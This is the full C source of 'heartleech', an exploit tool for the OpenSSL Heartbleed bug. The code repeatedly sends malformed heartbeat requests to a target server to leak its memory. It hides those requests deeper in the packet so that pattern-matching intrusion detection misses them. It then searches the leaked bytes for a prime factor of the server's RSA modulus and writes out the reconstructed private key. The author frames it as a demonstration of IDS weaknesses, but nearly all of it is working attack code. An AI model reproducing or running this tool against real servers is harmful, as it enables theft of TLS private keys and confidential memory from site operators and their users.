/*
    
    HEARTLEECH

    A program for exploiting Neel Mehta's "HeartBleed" bug. This program has
    the following features:
    
    IDS EVASION: the purpose of writing this program is to demonstrate the
    inadequacy of "pattern-match" intrusion detection system. The signatures
    released after heartbleed for Snort-like IDS trigger on the bytes "18 03"
    in the first two bytes of TCP payload. This program sticks those bytes
    deeper in the payload, demonstrating pattern-matching is a flawed approach
    to IDS. The correct approach is to analyze the SSL protocol. The
    open-source project Bro does protocol analysis, and can therefore detect
    this program, as do most commercial vendors.

    ENCRYPTED BLEEDS: This program completes the SSL handshake, so that the
    bled data is encrypted on the network. This also avoids angry log 
    messages complaining about truncated handshakes.

    REPEATED REQUESTS: This program can sit in an endless loop requesting
    hearbeats over and over again.

    IPV6: This program supports IPv6 as well as IPv4.

    NOTES ON ASYNC/MEM-BIO: Normal use of the OpenSSL library takes care of
    sockets communication for you. This program uses the library differently,
    handling TCP/IP sockets completely separate from SSL. It does this so
    that it can stick the heartbeat request after the data in the same packet
    for IDS evasion. I point this out because this is a good style for using
    OpenSSL for things that require asynchronous communication, where you
    can't have normal socket operations.
*/

/*
 * Legacy Windows stuff
 */
#define _CRT_SECURE_NO_WARNINGS 1
#if defined(WIN32)
#include <WinSock2.h>
#include <WS2tcpip.h>
#define snprintf _snprintf
#define sleep(secs) Sleep(1000*(secs))
#define WSA(err) (WSA##err)
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#define WSAGetLastError() (errno)
#define closesocket(fd) close(fd)
#define WSA(err) (err)
#endif
#if defined(_MSC_VER)
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "libeay32.lib")
#pragma comment(lib, "ssleay32.lib")
#endif

#include <ctype.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

/*
 * OpenSSL specific includes. We also define an OpenSSL internal
 * function that is normally not exposed in include files, so
 * that we can format our 'bleed' manually.
 */
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/rsa.h>

/*
 * This is an internal function, not declared in headers, we we
 * have to declare our own version
 */
int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);

#ifndef TLS1_RT_HEARTBEAT
#define TLS1_RT_HEARTBEAT 24
#endif


/*
 * Use '-d' option to get more verbose debug logging while running
 * the scan
 */
int is_debug = 0;

/**
 * Per connection data that is flushed at the end of the connection
 */
struct Connection {
    struct DumpArgs *args;
    struct {
        unsigned attempted;
        unsigned succeeded;
    } heartbleeds;
};

/**
 * Arguments for the heartbleed callback function. We read these from the
 * command line and pass them to the threads
 */
struct DumpArgs {
    unsigned is_alert;
    FILE *fp;
    const char *filename;
    const char *hostname;
    const char *cert_filename;
    const char *offline_filename;
    unsigned timeout;
    unsigned is_error;
    unsigned is_auto_pwn;
    unsigned is_rand_size;
    unsigned is_sent_good_heartbeat;
    struct {
        unsigned desired;
        unsigned done;
    } loop;
    unsigned ip_ver;
    unsigned port;
    size_t byte_count;
    unsigned long long total_bytes;
    BIGNUM n;
    BIGNUM e;
    unsigned char buf[70000];
};

/****************************************************************************
 ****************************************************************************/
int ERROR_MSG(const char *fmt, ...)
{
    va_list marker;
    va_start(marker, fmt);
    vfprintf(stderr, fmt, marker);
    va_end(marker);
    return -1;
}

int DEBUG_MSG(const char *fmt, ...)
{
    va_list marker;
    if (!is_debug)
        return 0;
    va_start(marker, fmt);
    vfprintf(stderr, fmt, marker);
    va_end(marker);
    return -1;
}


/****************************************************************************
 * Prints a typical hexdump, for debug purposes.
 ****************************************************************************/
void
hexdump(const unsigned char *buf, size_t len)
{
    size_t i;
    
    for (i=0; i<len; i += 16) {
        size_t j;

        printf("%04x ", (unsigned)i);
        for (j=i; j<len && j<i+16; j++) {
            printf("%02x ", buf[j]);
        }
        for ( ; j<i+16; j++)
            printf("   ");

        for (j=i; j<len && j<i+16; j++) {
            if (isprint(buf[j]) && !isspace(buf[j]))
                printf("%c", buf[j]);
            else
                printf(".");
        }
        printf("\n");
    }
}

/****************************************************************************
 * This is the "callback" that receives the hearbeat data. Since 
 * hearbeat is a control function and not part of the normal data stream
 * it can't be read normally. Instead, we have to install a hook within
 * the OpenSSL core to intercept them.
 ****************************************************************************/
void 
receive_heartbeat(int write_p, int version, int content_type,
            const void *vbuf, size_t len, SSL *ssl, 
            void *arg)
{
    struct Connection *connection = (struct Connection *)arg;
    struct DumpArgs *args = connection->args;
    const unsigned char *buf = (const unsigned char *)vbuf;

    /*
     * Ignore anything that isn't a "hearbeat". This function hooks
     * every OpenSSL-internal message, but we only care about
     * the hearbeats.
     */
    switch (content_type) {
    case SSL3_RT_CHANGE_CIPHER_SPEC: /* 20 */
    case SSL3_RT_HANDSHAKE: /* 22 */
    case SSL3_RT_APPLICATION_DATA: /* 23 */
    case 256: /* ???? why this? */
        return;
    case SSL3_RT_ALERT: /* 21 */
        DEBUG_MSG("[-] ALERT\n");
        args->is_alert = 1;
        return;
    case TLS1_RT_HEARTBEAT:
        break; /* handle below */
    default:
        ERROR_MSG("[-] msg_callback:%u: unknown type seen\n", content_type);
        return;
    }

    /*
     * See if this is a "good" heartbeat, which we send to probe
     * the system in order to see if it's been patched.
     */
    if (args->is_sent_good_heartbeat && len == 67) {
        static const char *good_response = 
            "\x02\x00\x30"
            "aaaaaaaaaaaaaaaa"
            "aaaaaaaaaaaaaaaa"
            "aaaaaaaaaaaaaaaa"
            ;
        if (memcmp(buf, good_response, 48+3) == 0) {
            ERROR_MSG("[-] PATCHED: good heartbeat received, bad heartbleed not\n");
            exit(1);
        }
    }

    /*
     * Inform user that we got some bleeding data
     */
    DEBUG_MSG("[+] %5u-bytes bleed received\n", (unsigned)len);

    /*
     * Copy this to the buffer
     */
    if (len > sizeof(args->buf) - args->byte_count)
        len = sizeof(args->buf) - args->byte_count;
    memcpy(args->buf + args->byte_count, buf, len);
    args->byte_count += len;

    /*
     * Display bytes if not dumping to file
     */
    if (!args->fp && is_debug) {
        hexdump(buf, len);
    }

    /* Count this, to verify that bleeds are working */
    connection->heartbleeds.succeeded++;
}


/****************************************************************************
 * Wrapper function for printing addresses, since the standard
 * "inet_ntop()" function doesn't process both addresses equally
 ****************************************************************************/
static const char *
my_inet_ntop(int family, struct sockaddr *sa, char *dst, size_t sizeof_dst)
{
    switch (family) {
    case AF_INET:
        inet_ntop(AF_INET, &(((struct sockaddr_in *)sa)->sin_addr),
                dst, sizeof_dst);
        break;
    case AF_INET6:
        inet_ntop(AF_INET6, &(((struct sockaddr_in6 *)sa)->sin6_addr),
                dst, sizeof_dst);
        break;
    default:
        dst[0] = '\0';
    }

    return dst;
}



/****************************************************************************
 * Given two primes, generate an RSA key. From RFC 3447 Appendix A.1.2
 *
    RSAPrivateKey ::= SEQUENCE {
          version           Version,
          modulus           INTEGER,  -- n
          publicExponent    INTEGER,  -- e
          privateExponent   INTEGER,  -- d
          prime1            INTEGER,  -- p
          prime2            INTEGER,  -- q
          exponent1         INTEGER,  -- d mod (p-1)
          exponent2         INTEGER,  -- d mod (q-1)
          coefficient       INTEGER,  -- (inverse of q) mod p
          otherPrimeInfos   OtherPrimeInfos OPTIONAL
      }
 ****************************************************************************/
RSA *
rsa_gen(const BIGNUM *p, const BIGNUM *q, const BIGNUM *e)
{
    BN_CTX *ctx = BN_CTX_new();
    RSA *rsa = RSA_new();
    BIGNUM p1[1], q1[1], r[1];

    BN_init(p1);
    BN_init(q1);
    BN_init(r);

	rsa->p = BN_new();
    BN_copy(rsa->p, p);
    rsa->q = BN_new();
    BN_copy(rsa->q, q);
    rsa->e = BN_new();
    BN_copy(rsa->e, e);

    /*
     * n - modulus (should be same as original cert, but we
     * recalculate it here 
     */
    rsa->n = BN_new();
    BN_mul(rsa->n, rsa->p, rsa->q, ctx);

    /*
     * d - the private exponent 
     */
    rsa->d = BN_new();
    BN_sub(p1, rsa->p, BN_value_one());
    BN_sub(q1, rsa->q, BN_value_one());
    BN_mul(r,p1,q1,ctx);
	BN_mod_inverse(rsa->d, rsa->e, r, ctx);

    /* calculate d mod (p-1) */
    rsa->dmp1 = BN_new();
	BN_mod(rsa->dmp1, rsa->d, rsa->p, ctx);

    /* calculate d mod (q-1) */
    rsa->dmq1 = BN_new();
	BN_mod(rsa->dmq1, rsa->d, rsa->q, ctx);

  	/* calculate inverse of q mod p */
    rsa->iqmp = BN_new();
  	BN_mod_inverse(rsa->iqmp, rsa->q, rsa->p, ctx);



    BN_free(p1);
    BN_free(q1);
    BN_free(r);

    BN_CTX_free(ctx);

    return rsa;
}

/****************************************************************************
 * This function searches a buffer looking for a prime that is a factor
 * of the public key
 ****************************************************************************/
int
find_private_key(const BIGNUM *n, const BIGNUM *e, 
                 const unsigned char *buf, size_t buf_length)
{
    size_t i;
    int prime_length = n->top * sizeof(BN_ULONG);
    BN_CTX *ctx;
    BIGNUM p;
    BIGNUM q;
    BIGNUM remainder;

    BN_init(&q);
    BN_init(&remainder);
    BN_init(&p);

    /* Need enough target data to hold at least one prime number */
    if (buf_length < (size_t)prime_length)
        return 0;

    ctx = BN_CTX_new();

    /* Go forward one byte at a time through the buffer */
    for (i=0; i<buf_length-prime_length; i++) {

        /* Grab a possible little-endian prime number from the buffer.
         * [NOTE] this assumes the target machine and this machine have
         * roughly the same CPU (i.e. x86). If the target machine is
         * a big-endian SPARC, but this machine is a little endian x86,
         * then this technique won't work.*/
        p.d = (BN_ULONG*)(buf+i);
        p.dmax = n->top/2;
        p.top = p.dmax;
        
        /* [optimization] Only process odd numbers, because even numbers
         * aren't prime. This doubles the speed. */
        if (!(p.d[0]&1))
            continue;

        /* [optimization] Make sure the top bits aren't zero. Firstly,
         * this won't be true for the large primes in question. Secondly,
         * a lot of bytes in dumps are zeroed out, causing this condition
         * to be true a lot. Not only does this quickly weed out target
         * primes, it takes BN_div() a very long time to divide when
         * numbers have leading zeroes
         */
        if (p.d[p.top-1] == 0)
            continue;

        /* Do the division, grabbing the remainder */
        BN_div(&q, &remainder, n, &p, ctx);
        if (!BN_is_zero(&remainder))
            continue;

        /* We have a match! Let's create an X509 certificate from this */
        {
            RSA *rsa;
            BIO *out = BIO_new(BIO_s_file());

            fprintf(stderr, "\n");
            BIO_set_fp(out,stdout,BIO_NOCLOSE);

            rsa = rsa_gen(&p, &q, e);
            PEM_write_bio_RSAPrivateKey(out, rsa, NULL, NULL, 0, NULL, NULL);

            /* the program doesn't need to continue */
            exit(0);
        }
    }

    BN_free(&q);
    BN_free(&remainder);
    BN_CTX_free(ctx);

    return 0;
}



/****************************************************************************
 * After reading a chunk of data, this function will process that chunk.
 * There are three things we might do with that data:
 *  1. save to a file for later offline processing
 *  2. search for private key
 *  3. hexdump to the command-line
 ****************************************************************************/
void
process_bleed(struct DumpArgs *args)
{
    size_t x;

    /* ignore empty chunks */
    if (args->byte_count == 0)
        return;

    /* track total bytes processed, for printing to the command-line */
    args->total_bytes += args->byte_count;

    /* write a copy of the bleeding data to a file for offline processing
     * by other tools */
    if (args->fp) {
        x = fwrite(args->buf, 1, args->byte_count, args->fp);
        if (x != args->byte_count) {
            ERROR_MSG("[-] %s: %s\n", args->filename, strerror(errno));
        }
    }

    /* do a live analysis of the bleeding data */
    if (args->is_auto_pwn) {
        if (find_private_key(&args->n, &args->e, args->buf, args->byte_count)) {
            printf("key found!\n");
            exit(1);
        }

    }

    args->byte_count = 0;
}



/****************************************************************************
 * Parse details from a certificate. We use this in order to grab
 * the 'modulus' from the certificate in order to crack it with
 * patterns found in memory. This is called in two places. One is when
 * we get the certificate from the server when connecting to it.
 * The other is offline cracking from files.
 ****************************************************************************/
void
parse_cert(X509 *cert, char name[512], BIGNUM *modulus, BIGNUM *e)
{
    X509_NAME *subj;
    EVP_PKEY *rsakey;

    /* we grab the server's name for debugging perposes */
    subj = X509_get_subject_name(cert);
    if (subj) {
        int len;
        len = X509_NAME_get_text_by_NID(subj, NID_commonName, 
                                        name, 512);
        if (len > 0) {
            name[255] = '\0';
            DEBUG_MSG("[+] servername = %s\n", name);
        }
    }

    /* we grab the 'modulus' (n) and the 'public exponenet' (e) for use
     * with private key search in the data */
    rsakey = X509_get_pubkey(cert);
    if (rsakey && rsakey->type == 6) {
        BIGNUM *n = rsakey->pkey.rsa->n;
        memcpy(modulus, n, sizeof(*modulus));
        memcpy(e, rsakey->pkey.rsa->e, sizeof(*e));
        DEBUG_MSG("[+] RSA public-key length = %u-bits\n", 
                                    n->top * sizeof(BN_ULONG) * 8);
    }
}



/****************************************************************************
 * Translate sockets error codes to helpful text for printing
 ****************************************************************************/
const char *
error_msg(unsigned err)
{
    switch (err) {
    case WSA(ECONNRESET): return "TCP connection reset";
    case WSA(ECONNREFUSED): return "Connection refused";
    case WSA(ETIMEDOUT): return "Timed out";
    case 0: return "TCP connection closed";
    default:   return "network error";
    }
}



/****************************************************************************
 * Use 'select()' to see if there is incoming data on the TCP connection.
 * This is just a typical use of select(), so that we don't block on the
 * socket.
 ****************************************************************************/
unsigned
is_incoming_data(int fd)
{
    int x;
    struct timeval tv;
    fd_set readset;
    fd_set writeset;
    fd_set exceptset;

    FD_ZERO(&readset);
    FD_ZERO(&writeset);
    FD_ZERO(&exceptset);
    FD_SET(fd, &readset);
    FD_SET(fd, &writeset);
    FD_SET(fd, &exceptset);
    tv.tv_sec = 0;
    tv.tv_usec = 1000;
    x = select((int)fd+1, &readset, NULL, &exceptset, &tv);
    if (x > 0)
        return 1; /*true, there's incoming data waiting */
    else
        return 0; /* false, nothing has been received */
}



/****************************************************************************
 * This is the main threat that creates a TCP connection, negotiates
 * SSL, and then starts sending queries at the server.
 ****************************************************************************/
int
ssl_thread(const char *hostname, struct DumpArgs *args)
{
    int x;
    struct addrinfo *addr;
    ptrdiff_t fd;
    SSL_CTX* ctx = 0;
    SSL* ssl = 0;
    BIO* rbio = 0;
    BIO* wbio = 0;
    size_t len;
    char buf[16384];
    char address[64];
    char *http_request;
    size_t total_bytes = 0;
    char port[6];
    time_t started;
    time_t last_status = 0;
    struct Connection connection;

    memset(&connection, 0, sizeof(connection));
    connection.args = args;

    /*
     * Open the output/dump file.
     */
    if (args->filename) {
        args->fp = fopen(args->filename, "ab+");
        if (args->fp == NULL) {
            perror(args->filename);
            return -1;
        }
    }


    /*
     * Format the HTTP request. We need to stick the "Host:" header in
     * the correct place in the header
     */
    {
        static const char *prototype = 
                "GET / HTTP/1.1\r\n"
                "Host: \r\n"
                "User-agent: test/1.0\r\n"
                "Connection: keep-alive\r\n"
                "\r\n";
        size_t prefix;
        http_request = (char*)malloc(strlen(prototype)+strlen(hostname)+1);
        memcpy(http_request, prototype, strlen(prototype)+1);
        prefix = strstr(prototype, "Host: ") - prototype + 6;
        memcpy(http_request + prefix, hostname, strlen(hostname));
        memcpy( http_request + prefix + strlen(hostname), 
                prototype + prefix, 
                strlen(prototype+prefix) + 1);
    }

    
    
    /*
     * Do the DNS lookup. A hostname may have multiple IP addresses, so we
     * print them all for debugging purposes. Normally, we'll just pick
     * the first address to use, but we allow the user to optionally
     * select the first IPv4 or IPv6 address with the -v option.
     */
    snprintf(port, sizeof(port), "%u", args->port);
    DEBUG_MSG("[ ] resolving \"%s\"\n", hostname);
    x =  getaddrinfo(hostname, port, 0, &addr);
    if (x != 0) {
        return ERROR_MSG("[-] %s: DNS lookup failed\n", hostname);
    } else if (is_debug) {
        struct addrinfo *a;
        for (a=addr; a; a = a->ai_next) {
            my_inet_ntop(a->ai_family, a->ai_addr, address, sizeof(address));
            DEBUG_MSG("[+]  %s\n", address);
        }
        DEBUG_MSG("\n");
    }
    while (addr && args->ip_ver == 4 && addr->ai_family != AF_INET)
        addr = addr->ai_next;
    while (addr && args->ip_ver == 6 && addr->ai_family != AF_INET6)
        addr = addr->ai_next;
    if (addr == NULL)
        return ERROR_MSG("IPv%u address not found\n", args->ip_ver);
    my_inet_ntop(addr->ai_family, addr->ai_addr, address, sizeof(address));

    
    
    /*
     * Create a normal TCP socket
     */
    fd = socket(addr->ai_family, SOCK_STREAM, 0);
    if (fd < 0)
        return ERROR_MSG("%u: could not create socket\n", addr->ai_family);
    
    
    /*
     * Do a normal TCP connect to the target IP address, sending a SYN and
     * so on
     */
    DEBUG_MSG("[ ] %s: connecting...\n", address);
    x = connect(fd, addr->ai_addr, (int)addr->ai_addrlen);
    if (x != 0) {
        ERROR_MSG("[-] %s: connect failed: %s (%u)\n", 
            address, error_msg(WSAGetLastError()), WSAGetLastError());
        if (args->loop.done == 0)
            exit(1);
        sleep(1);
        return 0;
    }
    DEBUG_MSG("[+] %s: connected\n", address);

    
    
    /* 
     * Initialize SSL structures. Specifically, we initialize them with
     * "memory" BIO instead of normal "socket" BIO, because we are handling
     * the socket communications ourselves, and are just using BIO to
     * encrypt outgoing buffers and decrypt incoming buffers.
     */
    ctx = SSL_CTX_new(SSLv23_client_method());
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    ssl = SSL_new(ctx);
    rbio = BIO_new(BIO_s_mem());
    wbio = BIO_new(BIO_s_mem());
    SSL_set_bio(ssl, rbio, wbio);
    SSL_set_connect_state(ssl);
    SSL_set_msg_callback(ssl, receive_heartbeat);
    SSL_set_msg_callback_arg(ssl, (void*)&connection);
    args->is_alert = 0;
    
    
    /* 
     * SSL handshake (rerouting the encryptions). This is an ASYNCHROUNOUS
     * technique using our own sockets and "memory BIO". It's not the normal
     * use of the API that you'd expect. We have to do do the send()/recv()
     * ourselves on sockets, then pass then through to the SSL layer 
     */
    DEBUG_MSG("[ ] SSL handshake started...\n");
    started = time(0);
    for (;;) {

        /* If we can't finish the SSL handshake in 6 seconds, we probably
         * never will */
        if (started + args->timeout < time(0)) {
            ERROR_MSG("[-] timeout waiting for SSL handshake\n");
            if (args->loop.done <= 1)
                exit(1);
            goto end;
        }

        /* If SSL stack wants to send something, then send it out the
         * TCP/IP stack */
        len = BIO_pending(wbio);
        if (len) {
            if (len > sizeof(buf))
                len = sizeof(buf);
            BIO_read(wbio, buf, (int)len);
            x = send(fd, buf, (int)len, 0);
            if (x <= 0) {
                ERROR_MSG("[-] %s:%s send fail\n", address, port);
                goto end;
            }
        }

        /* If the TCP/IP has received something, then pump the forward
         * the network data to the SSL stack */
        x = SSL_connect(ssl);
        if (x >= 0)
            break; /* success! */
        if (x == -1 && SSL_get_error(ssl, x) == SSL_ERROR_WANT_READ) {
            char buf[16384];

            if (is_incoming_data(fd)) {
                x = recv(fd, buf, sizeof(buf), 0);
                if (x > 0) {
                    BIO_write(rbio, buf, x);
                } else {
                    unsigned err = WSAGetLastError();
                    if (args->loop.done <= 1) {
                        ERROR_MSG("[-] %s (%u)\n", error_msg(err), err);
                        exit(1);
                    } else {
                        DEBUG_MSG("[-] %s (%u)\n", error_msg(err), err);
                        break;
                    }
                }
            }
        } else {
            ERROR_MSG("[-] %s:%s: SSL handshake failed: %d\n", 
                                     address, port, SSL_get_error(ssl, 0));
            goto end;
        }
    }
    DEBUG_MSG("[+] %s:%s: SSL handshake complete [%s]\n", 
                                        address, port, SSL_get_cipher(ssl));


    /*
     * Get the peer certificate from the handshake. We do this so that we
     * can automatically scan the heartbleed information for private key
     * information
     */
    {
        X509 *cert;
        char name[512];

        cert = SSL_get_peer_certificate(ssl);
        if (cert) {
            parse_cert(cert, name, &args->n, &args->e);
            X509_free(cert);
        }
    }

    /*
     * If heartbeats are disabled, then early exit
     */
    if (ssl->tlsext_heartbeat != 1) {
        ERROR_MSG("[-] target doesn't support heartbeats\n");
        exit(1);
    }

    /*
     * Loop many times
     */
again:
    if (args->loop.done++ >= args->loop.desired) {
        ERROR_MSG("[-] loop-count = 0\n");
        goto end;
    }

    /*
     * Print how many bytes we've downloaded on command-line every
     * second (to <stderr>)
     */
    if (last_status + 1 <= time(0)) {
        fprintf(stderr, "%llu bytes downloaded\r", args->total_bytes);
        last_status = time(0);
    }

    /*
     * If we have a buffer, flush it to the file
     */
    if (args->byte_count) {
        process_bleed(args);
    }

    /* 
     * Send the HTTP request (encrypt) and Heartbeat request. This causes
     * the hearbeat request to happen at the end of the packet instead of the
     * front, thus evading pattern-match IDS
     */
    ssl3_write_bytes(ssl, SSL3_RT_APPLICATION_DATA, 
                            http_request, (int)strlen(http_request));
    if (connection.heartbleeds.attempted > 5 
        && connection.heartbleeds.succeeded == 0) {
        /* we've sent a heartbleeds with no response, therefore try a
         * normal heartbeat */
        args->is_sent_good_heartbeat = 1;
        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, 
            "\x01\x00\x30"
            "aaaaaaaaaaaaaaaa"
            "aaaaaaaaaaaaaaaa"
            "aaaaaaaaaaaaaaaa"
            "aaaaaaaaaaaaaaaa",
            67);
    } else if (args->is_rand_size) {
        /* If configured to do so, do random sizes */
        unsigned size = rand();
        char rbuf[3];
        if (size <= 128)
            size = 128;
        rbuf[0] = 1;
        rbuf[1] = (char)(size>>8);
        rbuf[2] = (char)(size>>0);
        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, rbuf, 3);
        connection.heartbleeds.attempted++;
    } else {
        /* NORMALLY, just send a short heartbeat request */
        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, "\x01\xff\xff", 3);
        connection.heartbleeds.attempted++;
    }



    /* 
     * Transmit both requests (data and heartbeat) in the same packet
     */
    DEBUG_MSG("[ ] transmitting requests\n");
    while ((len = BIO_pending(wbio)) != 0) {
        if (len > sizeof(buf))
            len = sizeof(buf);
        BIO_read(wbio, buf, (int)len);
        x = send(fd, buf, (int)len, 0);
        if (x <= 0) {
            ERROR_MSG("[-] %s:%s: send fail\n", address, port);
            goto end;
        }
    }

    /*
     * Wait for the response. We are actually just waiting for the normal
     * HTTP-layer response, but during the wait, callbacks to the
     * "receive_heartbeat" function will happen.
     */
    DEBUG_MSG("[ ] waiting for response\n");
    started = time(0);
    for (;;) {
        char buf[65536];

        /* if we can an ALERT at the SSL layer, break out of this loop */
        if (args->is_alert)
            break;
        
        /* only wait a few seconds for a response */
        if (started + args->timeout < time(0)) {
            DEBUG_MSG("[-] timeout waiting for response\n");
            break;
        }

        /* Use 'select' to poll to see if there is data waiting for us
         * from the network */
        if (is_incoming_data(fd)) {
            x = recv(fd, buf, sizeof(buf), 0);
            if (x > 0) {
                total_bytes += x;
                BIO_write(rbio, buf, x);
            }
        }

        /*
         * Use the SSL function to decrypt the data that was put into the
         * BIO memory buffers above in the sockets.recv()/BIO_write()
         * combination.
         */
        x = SSL_read(ssl, buf, sizeof(buf));
        if (x < 0 || SSL_get_error(ssl, x) == SSL_ERROR_WANT_READ)
            ;
        else if (x < 0) {
            x = SSL_get_error(ssl, x);

            ERROR_MSG("[-] SSL error received\n");
            ERR_print_errors_fp(stderr);
            break;
        } else if (x > 0) {
            DEBUG_MSG("[+] %d-bytes data received\n", x);
            if (is_debug)
            if (memcmp(buf, "HTTP/1.", 7) == 0 && strchr(buf, '\n')) {
                size_t i;
                fprintf(stderr, "[+] ");
                for (i=0; i<(size_t)x && buf[i] != '\n'; i++) {
                    if (buf[i] == '\r')
                        continue;
                    if (isprint(buf[i]&0xFF))
                        fprintf(stderr, "%c", buf[i]&0xFF);
                    else
                        fprintf(stderr, ".");
                }
                fprintf(stderr, "\n");
            }
            goto again;
        }
    }

    /*
     * We've either reached our loop limit or the other side closed the
     * connection
     */
    DEBUG_MSG("[+] connection terminated\n");
end:
    process_bleed(args);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    closesocket(fd);
    if (args->fp) {
        fclose(args->fp);
        args->fp = NULL;
    }
    return 0;
}



/****************************************************************************
 * Process the files produced by this tool, or other tools, looking for
 * the private key in the given certificate.
 ****************************************************************************/
void
process_offline_file(const char *filename_cert, const char *filename_bin)
{
    FILE *fp;
    X509 *cert;
    char name[512];
    BIGNUM modulus;
    BIGNUM e;
    unsigned long long offset = 0;
    unsigned long long last_offset = 0;

    /*
     * Read in certificate
     */
    fp = fopen(filename_cert, "rb");
    if (fp == NULL) {
        perror(filename_cert);
        return;
    }
    cert = PEM_read_X509(fp, NULL, NULL, NULL);
	if (cert == NULL) {
		fprintf(stderr, "%s: error parsing certificate\n", filename_cert);
		fclose(fp);
		return;
	}
    fclose(fp);
    parse_cert(cert, name, &modulus, &e);

    /*
     * Read in the file to process
     */
    fp = fopen(filename_bin, "rb");
    if (fp == NULL) {
        perror(filename_bin);
        goto end;
    }
    while (!feof(fp)) {
        unsigned char buf[65536 + 18];
        size_t bytes_read;

        bytes_read = fread(buf, 1, sizeof(buf), fp);
        if (bytes_read == 0)
            break;

        if (find_private_key(&modulus, &e, buf, bytes_read)) {
            fprintf(stderr, "found: offset=%llu\n", offset);
            exit(1);
        }

        offset += bytes_read;

        if (offset > last_offset + 1024*1024) {
            printf("%llu bytes read\n", offset);
            last_offset = offset;
        }
    }
    fclose(fp);


	
	end:
	X509_free(cert);
}



/****************************************************************************
 ****************************************************************************/
int
main(int argc, char *argv[])
{
    int i;
    struct DumpArgs args;

    memset(&args, 0, sizeof(args));
    args.port = 443;
    args.loop.desired = 1000000;
    args.timeout = 6;

    if (argc <= 1 ) {
usage:
        printf("\n");
        printf("usage:\n heartleech -t<hostname> -f<filename> [-l<loops>]"
               " [-p<port>] [-v<IPver>]  ...\n");
        printf(" <hostname> is a DNS name or IP address of the target\n");
        printf(" <filename> is where the binary heartbleed information is stored\n");
        printf(" <loops> is the number of repeated attempts to grab the informaiton\n");
        printf(" <port> is the port number, defaulting to 443\n");
        printf(" <IPver> is the IP version (4 or 6)\n");
        return 1;
    }
    fprintf(stderr, "--- heartleech/1.0.0b ---\n");
    fprintf(stderr, "from https://github.com/robertdavidgraham/heartleech\n\n");


    /*
     * One-time program startup stuff for legacy Windows.
     */
#if defined(WIN32)
    {WSADATA x; WSAStartup(0x101,&x);}
#endif


    /*
     * One-time program startup stuff for OpenSSL.
     */
    CRYPTO_malloc_init();
    SSL_library_init();
    SSL_load_error_strings();
    ERR_load_BIO_strings();
    OpenSSL_add_all_algorithms();

                   
    if (SSLeay() < 0x01000100) {
        ERROR_MSG("[-] heartbeats unsupported in local SSL library: %s\n",
                  SSLeay_version(SSLEAY_VERSION));
        ERROR_MSG("[-] must link to OpenSSL/1.0.1a or later\n");
        exit(1);
    }
    
    /*
     * Parse the program options
     */
    for (i=1; i<argc; i++) {
        char c;
        const char *arg;

        /* All parameters start with the standard '-' */
        if (argv[i][0] != '-') {
            if (args.hostname == NULL) {
                args.hostname = argv[i];
                continue;
            } else {
                fprintf(stderr, "%s: unknown option\n", argv[i]);
                goto usage;
            }
        }

        /* 
         * parameters can be either of two ways:
         * -twww.google.com
         * -t www.google.com
         */
        c = argv[i][1];
        if (c == 'd' || c == 'a')
            ;
        else if (argv[i][2] == '\0') {
            arg = argv[++i];
            if (i >= argc) {
                fprintf(stderr, "-%c: missing parameter\n", c);
                goto usage;
            }
        } else
            arg = argv[i] + 2;

        /*
         * Get the parameter
         */
        switch (c) {
        case 'a':
            args.is_auto_pwn = 1;
            break;
        case 'c':
            args.cert_filename = arg;
            break;
        case 'd':
            is_debug++;
            break;
        case 't':
            args.hostname = arg;
            break;
        case 'f':
            args.filename = arg;
            break;
        case 'F':
            args.offline_filename = arg;
            break;
        case 'l':
            args.loop.desired = strtoul(arg, 0, 0);
            break;
        case 'p':
            args.port = strtoul(arg, 0, 0);
            if (args.port >= 65536) {
                fprintf(stderr, "%u: bad port number\n", args.port);
                goto usage;
            }
            break;
        case 'S':
            args.is_rand_size = 1;
            break;
        case 'v':
            args.ip_ver = strtoul(arg, 0, 0);
            switch (args.ip_ver) {
            case 4:
            case 6:
                break;
            default:
                fprintf(stderr, "%u: unknown IP version (must be 4 or 6)\n",
                    args.ip_ver);
                goto usage;
            }
            break;
        default:
            fprintf(stderr, "-%c: unknown argument\n", c);
            goto usage;
        }
    }
    if (args.hostname != 0) {
        /*
         * Now run the thread
         */
        while (args.loop.done < args.loop.desired) {
            int x;
            x = ssl_thread(args.hostname, &args);
            if (x < 0)
                break;
        }
    } else if (args.offline_filename != 0 && args.cert_filename != 0) {
        process_offline_file(args.cert_filename, args.offline_filename);
    } else {
        fprintf(stderr, "no target specified, use \"-t <hostname>\"\n");
        goto usage;
    }

    DEBUG_MSG("[+] local OpenSSL 0x%x(%s)\n", 
              SSLeay(), SSLeay_version(SSLEAY_VERSION));

    /*
     * Finished. We should do a more gracefull close, but I'm lazy
     */
    if (args.fp)
        fclose(args.fp);
    return 0;
}
